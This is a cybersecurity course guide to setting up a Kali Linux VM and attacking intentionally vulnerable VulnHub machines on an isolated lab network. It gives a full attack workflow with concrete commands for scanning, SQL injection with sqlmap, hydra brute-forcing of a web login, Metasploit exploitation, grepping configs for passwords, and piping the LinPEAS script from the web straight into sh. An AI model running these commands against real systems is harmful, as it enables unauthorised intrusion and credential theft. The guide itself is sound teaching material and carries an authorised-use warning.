# Kali Linux VM Setup & VulnHub Attack Guide

This guide covers everything you need to set up a Kali Linux virtual machine and use it to attack practice machines from VulnHub. It is a companion to the CYB204 Docker Labs but is completely independent — no Docker knowledge required.

---

## Table of Contents

1. [Why a Kali VM?](#1-why-a-kali-vm)
2. [Install a Hypervisor](#2-install-a-hypervisor)
3. [Install Kali Linux](#3-install-kali-linux)
4. [First Boot and Essential Setup](#4-first-boot-and-essential-setup)
5. [Understand VM Networking](#5-understand-vm-networking)
6. [Download a VulnHub Machine](#6-download-a-vulnhub-machine)
7. [Import and Configure the VulnHub VM](#7-import-and-configure-the-vulnhub-vm)
8. [Discover the Target IP](#8-discover-the-target-ip)
9. [Attack Methodology](#9-attack-methodology)
10. [Recommended VulnHub Machines by Week](#10-recommended-vulnhub-machines-by-week)
11. [Saving Your Work](#11-saving-your-work)
12. [Troubleshooting](#12-troubleshooting)

---

## 1. Why a Kali VM?

The Docker labs in this course include a built-in Kali attacker container for guided exercises. A separate Kali VM is useful when:

- Practising on **VulnHub machines** (standalone VMs that cannot run inside Docker)
- Working on your **Assessment 2 pentest report** against a realistic target
- Building a persistent toolset across sessions (installed tools, configs, notes all survive reboots)
- Preparing for industry certifications (OSCP, CEH) that expect a native Kali environment

---

## 2. Install a Hypervisor

A hypervisor lets you run Kali (and your target VMs) on your laptop without affecting your main OS.

### VirtualBox (free, recommended for most students)

1. Download from https://www.virtualbox.org/wiki/Downloads  
   Choose the installer for your host OS (Windows, macOS Intel, macOS Apple Silicon, or Linux).
2. Also download and install the **VirtualBox Extension Pack** from the same page — it adds USB 2.0/3.0 support and improves performance.
3. Run the installer and follow the defaults.

### VMware (alternative)

- **Windows / Linux:** VMware Workstation Player (free) — https://www.vmware.com/products/workstation-player.html
- **macOS:** VMware Fusion Player (free for personal use) — https://www.vmware.com/products/fusion.html

> Both hypervisors work well. VirtualBox is used in the examples below because it is free on all platforms and widely supported.

---

## 3. Install Kali Linux

Kali provides a pre-built virtual machine image — no manual OS installation needed.

### Download the pre-built VM

1. Go to https://www.kali.org/get-kali/#kali-virtual-machines
2. Choose **VirtualBox** (`.ova` file) or **VMware** (`.7z` archive) depending on your hypervisor.
3. Download and verify the SHA256 checksum shown on the page:
   ```bash
   # macOS / Linux
   shasum -a 256 kali-linux-*.ova

   # Windows (PowerShell)
   Get-FileHash kali-linux-*.ova -Algorithm SHA256
   ```
   Compare the output to the checksum on the Kali website before proceeding.

### Import into VirtualBox

1. Open VirtualBox → **File → Import Appliance**
2. Browse to the downloaded `.ova` file → **Next**
3. Review the settings (defaults are fine) → **Finish**
4. Wait for the import to complete (~2–5 minutes)

### Import into VMware

1. Extract the `.7z` archive with 7-Zip (Windows) or `7z x <file>` (Linux/macOS)
2. In VMware, choose **Open a Virtual Machine** and select the extracted `.vmx` file

### Default credentials

| Username | Password |
|----------|----------|
| `kali` | `kali` |

Change the password after first login:
```bash
passwd
```

### Recommended VM settings

In VirtualBox, select the Kali VM → **Settings** and adjust:

| Setting | Recommended |
|---------|-------------|
| Memory (RAM) | 4096 MB (4 GB minimum) |
| Processors | 2 CPUs |
| Display → Video Memory | 128 MB |
| Storage | 80 GB (pre-configured in the OVA) |

---

## 4. First Boot and Essential Setup

Start the VM, log in with `kali / kali`, then open a terminal.

### Update the system

```bash
sudo apt update && sudo apt full-upgrade -y
```

This takes 10–20 minutes on first run. Do it before anything else.

### Install Guest Additions (VirtualBox only)

Guest Additions improves screen resolution, clipboard sharing, and drag-and-drop.

In VirtualBox menu: **Devices → Insert Guest Additions CD Image**

```bash
sudo apt install -y virtualbox-guest-x11
sudo reboot
```

### Enable clipboard sharing (VirtualBox)

With the VM powered off: **Settings → General → Advanced**  
Set **Shared Clipboard** and **Drag'n'Drop** to **Bidirectional**.

### Verify key tools are installed

```bash
nmap --version
hydra --help | head -1
john --version
msfconsole --version
gobuster version
```

If anything is missing:
```bash
sudo apt install -y nmap hydra john metasploit-framework gobuster nikto sqlmap dirb
```

---

## 5. Understand VM Networking

Getting the network right is the most important step. Kali and your target VM must be able to reach each other but should be isolated from your host OS and the internet.

### Network modes explained

| Mode | Kali can reach target? | Target has internet? | Use case |
|------|----------------------|---------------------|----------|
| **NAT** (default) | ✗ — each VM is isolated | ✓ | General Kali use, updates |
| **Host-only** | ✓ | ✗ | Attacking VulnHub VMs — recommended |
| **NAT Network** | ✓ | ✓ | If the target needs internet to boot |
| **Bridged** | ✓ | ✓ | Connects to your real LAN — avoid for labs |

### Recommended setup: Host-only adapter

A host-only network is a private virtual LAN that only exists inside your laptop. Nothing on the internet can reach the VMs, and the VMs cannot reach the internet (only each other and the host).

**VirtualBox — create a Host-only network (do this once):**

1. **File → Host Network Manager** (or **Tools → Network** on newer versions)
2. Click **Create** — VirtualBox creates `vboxnet0` (or similar)
3. Note the IP range shown (e.g. `192.168.56.0/24`) — your Kali VM will get an address in this range

**Assign the adapter to your Kali VM:**

1. Select Kali VM → **Settings → Network**
2. **Adapter 1:** NAT (keep this for internet/updates)
3. **Adapter 2:** Host-only Adapter → select `vboxnet0`
4. Click OK

**Assign the adapter to your target (VulnHub) VM:**

1. Select the target VM → **Settings → Network**
2. **Adapter 1:** Host-only Adapter → select `vboxnet0`
3. Click OK (the target does not need internet)

After booting both VMs, Kali will have two IP addresses — one on NAT (for internet) and one on the host-only network (for attacking the target). Use the host-only IP for all attack traffic.

Find Kali's host-only IP:
```bash
ip addr show eth1      # or the second adapter name shown by `ip addr`
```

---

## 6. Download a VulnHub Machine

1. Browse to https://www.vulnhub.com
2. Find a machine — each week's `README.md` in this repo recommends two machines aligned to that week's topic
3. Click the machine name → scroll down to **Download**
4. Download the `.ova` or `.vmdk` / `.zip` file

> Stick to machines rated **Easy** or **Medium** while building skills. The difficulty rating is shown on each machine's page.

---

## 7. Import and Configure the VulnHub VM

### OVA files (VirtualBox format)

```
File → Import Appliance → select the .ova → Next → Finish
```

After import:
1. Select the VM → **Settings → Network → Adapter 1**
2. Change to **Host-only Adapter** → select `vboxnet0`
3. Click OK

### VMDK files (VMware format used in VirtualBox)

1. Create a new VM in VirtualBox: **New**
2. Name it, choose **Linux / Debian 64-bit** (most VulnHub machines)
3. When asked for a hard disk, choose **Use an existing virtual hard disk file** → select the `.vmdk`
4. After creation: **Settings → Network → Adapter 1 → Host-only**

### VMware users

Most VulnHub machines include a `.vmx` file or can be opened directly:
- `File → Open` → select the `.vmx`
- Set network to **Host-only**

---

## 8. Discover the Target IP

VulnHub machines boot and acquire an IP automatically via DHCP (from your host-only network). You need to find that IP before you can attack.

### Method 1 — Nmap host discovery (recommended)

Find your own Kali host-only IP first:
```bash
ip addr show eth1
# e.g. 192.168.56.101/24  →  subnet is 192.168.56.0/24
```

Scan the subnet for live hosts:
```bash
sudo nmap -sn 192.168.56.0/24
```

The result lists all responding IPs. Your target is the one that is not your Kali IP or the gateway.

### Method 2 — ARP scan

```bash
sudo arp-scan --localnet
# or
sudo netdiscover -r 192.168.56.0/24
```

### Method 3 — Read the target's screen

Many VulnHub machines display their IP address on the login screen. No Kali command needed.

---

## 9. Attack Methodology

Follow the same reconnaissance → enumeration → exploitation → post-exploitation flow used in the Docker labs.

### Step 1 — Full port scan

```bash
TARGET=192.168.56.xxx     # replace with actual IP

sudo nmap -sV -sC -p- --open -T4 $TARGET -oN nmap-full.txt
```

Flags: `-sV` version detection, `-sC` default scripts, `-p-` all 65535 ports, `--open` only open ports, `-oN` save output.

### Step 2 — Service enumeration

Based on open ports, run targeted tools:

```bash
# Web server (port 80/443)
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
nikto -h http://$TARGET

# FTP (port 21) — test anonymous login
ftp $TARGET
# username: anonymous  password: (blank)

# SSH (port 22) — check version for known CVEs, try default creds
ssh $TARGET

# SMB (port 445)
enum4linux -a $TARGET
smbclient -L //$TARGET -N

# MySQL (port 3306)
mysql -h $TARGET -u root -p

# LDAP (port 389)
ldapsearch -x -H ldap://$TARGET -b "" -s base namingContexts
```

### Step 3 — Vulnerability research

Note the service versions from Nmap, then search:

```bash
searchsploit <service name and version>
# e.g.
searchsploit vsftpd 2.3.4
searchsploit "openssh 7.2"
```

Or search online: `exploit-db.com`, `nvd.nist.gov`

### Step 4 — Exploitation

**With Metasploit:**
```bash
msfconsole

msf6 > search <vulnerability name>
msf6 > use <module path>
msf6 > show options
msf6 > set RHOSTS <target IP>
msf6 > set LHOST <your Kali IP>
msf6 > run
```

**Manual exploit (Python/bash):**
```bash
# Download exploit from Exploit-DB
searchsploit -m <exploit ID>
python3 exploit.py <target IP> <port>
```

**Web application attacks:**
```bash
# SQL injection
sqlmap -u "http://$TARGET/page.php?id=1" --dbs

# Password brute-force on web login
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid"
```

### Step 5 — Post-exploitation and privilege escalation

Once you have a shell:

```bash
# Who are you?
id && whoami

# Kernel and OS info
uname -a
cat /etc/os-release

# Check sudo permissions
sudo -l

# Find SUID binaries (run as root regardless of who executes them)
find / -perm -4000 -type f 2>/dev/null

# Check writable cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Look for passwords in config files
grep -r "password" /var/www/ /etc/ 2>/dev/null | grep -v Binary

# LinPEAS (automated privilege escalation checker)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Useful reference: https://gtfobins.github.io — shows how to exploit SUID/sudo misconfigurations for any binary.

### Step 6 — Capture the flags

Most VulnHub machines follow the same CTF convention used in this course:

```bash
# User flag (after gaining initial shell as a low-privilege user)
find / -name "user.txt" 2>/dev/null
cat /home/<username>/user.txt

# Root flag (after escalating to root)
cat /root/root.txt
```

---

## 10. Recommended VulnHub Machines by Week

Each machine is listed in its week's `README.md`. The table below collects them for quick reference.

| Week | Topic | Machine | URL | Difficulty |
|------|--------|---------|-----|------------|
| 1 | Network analysis | Basic Pentesting: 1 | vulnhub.com/entry/basic-pentesting-1,216/ | Easy |
| 1 | Network analysis | Kioptrix Level 1 | vulnhub.com/entry/kioptrix-level-1-1,22/ | Easy |
| 3 | Scoping & recon | Stapler | vulnhub.com/entry/stapler-1,150/ | Medium |
| 3 | Scoping & recon | Tr0ll | vulnhub.com/entry/tr0ll-1,100/ | Easy |
| 4 | Nmap & recon | Mr. Robot | vulnhub.com/entry/mr-robot-1,151/ | Medium |
| 4 | Nmap & recon | Kioptrix Level 2 | vulnhub.com/entry/kioptrix-level-11-2,23/ | Easy |
| 5 | Enumeration | Lazy Admin | vulnhub.com/entry/lazysysadmin-1,205/ | Easy |
| 5 | Enumeration | Kioptrix Level 3 | vulnhub.com/entry/kioptrix-level-12-3,24/ | Medium |
| 6 | Password cracking | DC-2 | vulnhub.com/entry/dc-2,311/ | Easy |
| 6 | Password cracking | VulnOS: 2 | vulnhub.com/entry/vulnos-2,147/ | Medium |
| 7 | Web app vulns | DVWA (standalone) | vulnhub.com/entry/damn-vulnerable-web-application-dvwa-107,43/ | Easy |
| 7 | Web app vulns | Metasploitable 2 | vulnhub.com/entry/metasploitable-2,29/ | Easy |
| 8 | Privilege escalation | Tr0ll 2 | vulnhub.com/entry/tr0ll-2,107/ | Medium |
| 8 | Privilege escalation | SickOS 1.1 | vulnhub.com/entry/sickos-11,132/ | Medium |
| 9 | Pivoting | Tre | vulnhub.com/entry/tre-1,483/ | Medium |
| 9 | Pivoting | Gemini Inc | vulnhub.com/entry/gemini-inc-1,385/ | Medium |
| 10 | Buffer overflow | /dev/random: scream | vulnhub.com/entry/devrandom-scream,47/ | Medium |
| 10 | Buffer overflow | Protostar | vulnhub.com/entry/protostar,6/ | Easy |

---

## 11. Saving Your Work

### Take VM snapshots

Before attempting an exploit, snapshot your Kali VM so you can roll back if something goes wrong:

**VirtualBox:** Machine → **Take Snapshot** → name it (e.g. "Before Week 4 exploit")  
**VMware:** VM → **Snapshot → Take Snapshot**

### Keep notes

Create a notes file for each machine you attack:

```bash
mkdir -p ~/vulnhub/<machine-name>
cd ~/vulnhub/<machine-name>
nano notes.txt
```

A good notes template:
```
Target:      192.168.56.xxx
Date:        YYYY-MM-DD

## Open Ports
22/tcp  OpenSSH 7.4
80/tcp  Apache 2.4.18

## Credentials Found
admin:password123

## Exploitation Path
1. Found LFI in /page.php?file=
2. Read /etc/passwd — saw user 'john'
3. Cracked hash from /etc/shadow with john

## Flags
user.txt:  flag{...}
root.txt:  flag{...}
```

This is also excellent material for your Assessment 2 pentest report.

---

## 12. Troubleshooting

**Kali VM cannot ping the target**  
Confirm both VMs are on the same host-only network adapter (e.g. `vboxnet0`). In VirtualBox, check Settings → Network for each VM.

**Target VM gets no IP address**  
The VulnHub machine may need DHCP. Ensure the host-only network has a DHCP server enabled:  
VirtualBox → **File → Host Network Manager** → select `vboxnet0` → **DHCP Server** tab → tick **Enable Server**.

**Nmap shows "Host seems down"**  
Some VulnHub machines block ICMP. Add `-Pn` to skip the ping check:
```bash
sudo nmap -Pn -sV $TARGET
```

**"Connection refused" on every port**  
The target VM may still be booting. Wait 60–90 seconds after the boot screen appears, then re-scan.

**Metasploit exploit fails with "No session created"**  
Check that `LHOST` is set to your Kali host-only IP (not `127.0.0.1` or your NAT IP):
```bash
# Inside msfconsole
set LHOST 192.168.56.101    # your Kali host-only IP
```

**Screen resolution is tiny in Kali**  
Install Guest Additions (see Section 4) and set the display to at least 1280×800 via **View → Virtual Screen → Scale**.

---

> **Authorised use only.** Only attack machines you own or have explicit permission to test. VulnHub machines are intentionally vulnerable and should always be run on an isolated host-only network — never on a network with other people's devices.
